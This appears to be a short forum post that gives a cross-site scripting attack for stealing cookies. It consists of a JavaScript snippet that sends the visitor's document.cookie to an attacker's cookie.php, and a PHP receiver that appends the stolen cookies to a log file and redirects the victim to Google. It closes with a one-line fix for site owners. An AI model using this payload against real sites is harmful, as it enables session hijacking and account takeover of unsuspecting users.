<script language="JavaScript">
document.location= " http://www.yoursite.com/cookie.php?p=" + document.cookie; </script>

and in your site put this and name it cookie.php

<?php
$cookie = $HTTP_GET_VARS[" p"]; 
$file = fopen(&#039;cookielog.txt&#039;, &#039;a&#039;); 
fwrite($file, $cookie . "\n\n"); 
echo " <script>location.href=&#039;http://www.google.com&#039;;</script>";
?>


If you&#039;re the owner, a "fix" for this is disallow html in announcements.
